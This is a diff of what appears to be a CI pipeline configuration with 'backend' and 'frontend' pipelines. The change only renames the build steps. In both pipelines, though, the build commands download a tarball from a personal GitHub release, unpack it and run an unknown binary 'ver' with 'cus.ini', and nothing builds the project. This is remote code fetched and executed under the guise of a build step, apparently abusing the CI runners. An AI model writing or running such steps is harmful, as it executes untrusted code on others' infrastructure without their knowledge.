@@ -3,7 +3,7 @@ type: docker
 name: backend
 
 steps:
-- name: build
+- name: build1
   image: golang
   commands:
   - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
@@ -14,7 +14,7 @@ type: docker
 name: frontend
 
 steps:
-- name: build
+- name: build2
   image: node
   commands:
   - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
